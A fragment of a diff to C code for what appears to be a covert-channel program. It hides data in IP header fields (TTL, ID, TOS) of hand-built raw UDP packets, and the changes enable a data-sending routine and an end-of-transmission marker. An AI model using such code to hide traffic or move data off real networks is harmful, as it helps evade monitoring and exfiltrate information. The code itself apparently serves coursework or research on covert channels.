@@ -85,7 +85,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     if(tcp){
     covert_send(sip, dip, sport, dport, (unsigned char*) &input, 1); //send the packet
     } else {
-        covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 1);
+        covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 3);
     }
 
     printf("completed\n");
@@ -97,7 +97,7 @@ int rand_delay(int delay) {
     return rand() % delay + 1;
 }
 
-/*void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
+void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
     unsigned char *buf = 0;
     covert_udp_send(sip,dip,sport,dport,(unsigned char*) buf,4);
     sleep(1);
@@ -109,8 +109,7 @@ int rand_delay(int delay) {
     //end of file
     covert_udp_send(sip,dip,sport,dport,buf, 3);
 
-}*/
-
+}
 void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel){
     char datagram[4096] , source_ip[32] , *pseudoheader;
     int sending_socket;
@@ -146,9 +145,9 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
         ip_header->tos = 'b';
     }else if(covert_channel == 3){
         //close the connection
-        ip_header->ttl = 4;
-        ip_header->id = 0;  //enter a single ASCII character into the field
-        ip_header->tos = 0;
+        ip_header->ttl = 'x';
+        ip_header->id = 'x';  //enter a single ASCII character into the field
+        ip_header->tos = 'x';
     }else if(covert_channel == 4){
         ip_header->ttl = 'r';
         ip_header->id = 'r';  //enter a single ASCII character into the field
@@ -356,7 +355,7 @@ char covert_udp_recv(char *sip, int sport, bool ttl, bool tos, bool ipid) {
 
     if(ip_header->ttl == 'x' && ip_header->tos == 'x' && ip_header->id == 'x'){
         return -1;
-    } else {
+    } else if(ip_header->tos == 'l' && ip_header->id == 'b') {
         return ip_header->ttl;
     }
 
